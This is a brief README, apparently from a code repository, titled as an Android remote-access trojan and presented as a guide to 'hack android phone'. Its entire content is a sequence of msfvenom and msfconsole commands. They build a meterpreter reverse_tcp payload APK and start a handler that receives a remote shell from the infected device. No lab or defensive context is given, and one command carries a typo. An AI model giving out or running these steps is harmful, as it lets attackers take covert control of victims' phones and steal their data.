# kali_metasploit_rat_for_androd
Collected From Bd Grey Hat Hackers

How to hack android phone using Metasploit.
Commands - 
1. msfvenom -p android/meterpreter/reverse_tcp LHOST="Your Ip" LPORT+4444 R > main.apk

2. msfconsole

3. use multi/handler

4. set payload android/meterpreter/reverse_tcp

5. set lhost "your IP"
6. set lport 4444

7. exploit
